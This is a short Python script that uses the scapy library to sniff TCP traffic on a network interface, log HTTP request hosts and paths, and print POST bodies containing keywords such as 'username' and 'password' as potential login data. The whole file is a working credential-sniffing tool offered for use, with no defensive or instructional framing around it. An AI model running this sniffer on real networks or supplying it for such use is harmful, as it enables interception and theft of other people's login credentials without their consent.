import scapy.all as scapy
from scapy.layers import http

def sniffing(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packet, filter='tcp')

def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        http_layer = packet[http.HTTPRequest]
        print(f"HTTP Request >> {http_layer.Host}{http_layer.Path}")

        if http_layer.Method == b"POST":
            # Extract raw packet data
            if packet.haslayer(scapy.Raw):
                load = packet[scapy.Raw].load.decode(errors="ignore")
                print(f"Raw load: {load}")

                # Try to find login info (this is heuristic and may need to be customized)
                keywords = ["username", "user", "login", "password", "pass"]
                for keyword in keywords:
                    if keyword in load:
                        print(f"Potential {keyword} data: {load}")

if __name__ == "__main__":
    interface = "en0"  # Replace with your network interface
    sniffing(interface)
